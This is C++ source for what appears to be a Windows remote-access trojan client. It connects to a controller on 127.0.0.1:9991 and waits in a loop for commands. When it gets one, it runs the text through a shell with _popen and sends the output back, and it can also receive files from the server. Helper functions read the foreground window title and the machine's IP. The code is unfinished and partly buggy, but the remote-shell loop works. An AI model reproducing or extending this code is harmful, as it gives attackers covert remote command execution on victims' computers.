#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM



#include <conio.h>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>

#include <Windows.h>
#include <fstream>


#include <atlstr.h>
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


std::string GetActiveWindowTitle()
{
    char windowTitle[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    return std::string(windowTitle);
}

std::string GetPublicIP()
{
    char hostName[NI_MAXHOST];
    if (gethostname(hostName, NI_MAXHOST) != 0)
    {
        return std::string("");
    }

    ADDRINFOA hints = {};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    ADDRINFOA* pResult;
    if (getaddrinfo(hostName, NULL, &hints, &pResult) != 0)
    {
        return std::string("");
    }

    SOCKADDR_IN addr = *(LPSOCKADDR_IN) pResult->ai_addr;
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
    std::string publicIP(ip);

    freeaddrinfo(pResult);
    return publicIP;
}


char size[4096];

void GetFileFromServer(SOCKET sok)
{
    

	
    recv(sok , size, 4096,0);
    int file_size = std::atoi(size);// char to int 
    char * bytes = new char[file_size];
	recv(sok,bytes,file_size,0);
    std::cout << size<<std::endl;
     
	
	std::cout<<"DATA: "<<bytes<< std::endl;

	

    

}

std::string runCommand(const std::string &command) {
    std::string data;
    FILE *stream;
    char buffer[1024];

    stream = _popen(command.c_str(), "r");
    if (stream) {
        while (!feof(stream)) {
            if (fgets(buffer, 1024, stream) != NULL) {
                data.append(buffer);
            }
        }
        _pclose(stream);
    }
    return data;
}


enum class Packet 
{
	cmd,file,runfile
};
int main()
{
    
    
	WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    int iResult;
    


    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", "9991", &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    
    
	
    char recvBuffer[1024];
    while (true)
	{
		
		iResult = recv(ConnectSocket, recvBuffer, sizeof(recvBuffer), 0);
		if (iResult > 0) {
        std::cout << "Received: " << recvBuffer << std::endl;
        if (strcmp(recvBuffer, "CMD") == 0)
        {
            
            recv(ConnectSocket,recvBuffer,sizeof(recvBuffer),0);
            send(ConnectSocket,runCommand(recvBuffer).c_str(),runCommand(recvBuffer).length()+1,0);
            
        }

        if(strcmp(recvBuffer, "File") == 0)
        {
            
            GetFileFromServer(ConnectSocket);
            
           
        }
    }

    }
	
	
    
	             
    

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
